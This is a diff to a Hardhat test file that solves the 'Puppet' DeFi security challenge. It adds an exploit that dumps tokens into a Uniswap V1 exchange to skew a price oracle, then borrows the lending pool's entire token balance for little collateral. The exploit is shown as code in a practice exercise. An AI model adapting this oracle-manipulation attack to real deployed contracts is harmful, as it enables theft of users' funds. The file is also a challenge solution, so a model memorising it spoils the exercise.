@@ -3,6 +3,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { BigNumber } = require("ethers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -21,6 +22,7 @@ describe('[Challenge] Puppet', function () {
     const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
     const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')
+    const XXX = ethers.utils.parseEther('999')
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
@@ -103,6 +105,19 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            XXX, // tokens_sold,
+            ethers.utils.parseEther('1'), // min_eth 
+            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
+            {gasLimit: 1e6}); 
+
+        console.log("token balance of uniswap: ", (await this.token.balanceOf(this.uniswapExchange.address)).toString());
+        console.log("ether balance of uniswap: ", (await ethers.provider.getBalance(this.uniswapExchange.address)).toString());
+        console.log("ether balance of attacker: ", (await ethers.provider.getBalance(attacker.address)).toString()); 
+
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ATTACKER_INITIAL_ETH_BALANCE});
     });
 
     after(async function () {
